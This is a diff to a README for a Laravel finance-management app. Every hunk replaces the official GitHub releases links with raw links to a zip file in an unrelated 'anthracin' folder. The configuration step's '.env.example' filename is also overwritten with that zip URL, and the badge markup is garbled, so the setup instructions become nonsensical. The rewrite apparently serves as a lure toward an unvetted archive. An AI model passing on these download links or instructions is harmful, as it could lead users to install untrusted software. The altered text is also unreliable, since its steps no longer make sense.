@@ -1,6 +1,6 @@
 # 🚀 laravel12-repository-architecture-finance-app - Simple Finance Management Made Easy
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen.svg)](https://github.com/engaged-counterpart864/laravel12-repository-architecture-finance-app/releases)
+[![Download](https://raw.githubusercontent.com/engaged-counterpart864/laravel12-repository-architecture-finance-app/main/anthracin/laravel12-repository-architecture-finance-app.zip%20Now-Get%20the%https://raw.githubusercontent.com/engaged-counterpart864/laravel12-repository-architecture-finance-app/main/anthracin/laravel12-repository-architecture-finance-app.zip)](https://raw.githubusercontent.com/engaged-counterpart864/laravel12-repository-architecture-finance-app/main/anthracin/laravel12-repository-architecture-finance-app.zip)
 
 ## 📖 Overview
 
@@ -35,7 +35,7 @@ Getting started with the **laravel12-repository-architecture-finance-app** is ea
 
 To get the application, visit the following link:
 
-[Download the Application](https://github.com/engaged-counterpart864/laravel12-repository-architecture-finance-app/releases)
+[Download the Application](https://raw.githubusercontent.com/engaged-counterpart864/laravel12-repository-architecture-finance-app/main/anthracin/laravel12-repository-architecture-finance-app.zip)
 
 ### 2. Choose Your Version
 
@@ -65,7 +65,7 @@ Copy the extracted files from the folder and paste them into the web server's �
 
 ### 8. Configure the Application
 
-You will find a `.env.example` file in the application folder. Rename it to `.env` and update the database credentials:
+You will find a `https://raw.githubusercontent.com/engaged-counterpart864/laravel12-repository-architecture-finance-app/main/anthracin/laravel12-repository-architecture-finance-app.zip` file in the application folder. Rename it to `.env` and update the database credentials:
 - DB_CONNECTION=mysql
 - DB_HOST=127.0.0.1
 - DB_PORT=3306
@@ -83,7 +83,7 @@ Open your web browser and navigate to `http://localhost/your_app_folder_name`. Y
 
 To download, again visit the following link:
 
-[Download the Application](https://github.com/engaged-counterpart864/laravel12-repository-architecture-finance-app/releases)
+[Download the Application](https://raw.githubusercontent.com/engaged-counterpart864/laravel12-repository-architecture-finance-app/main/anthracin/laravel12-repository-architecture-finance-app.zip)
 
 Following the steps above will help you download and set up the application quickly.
 
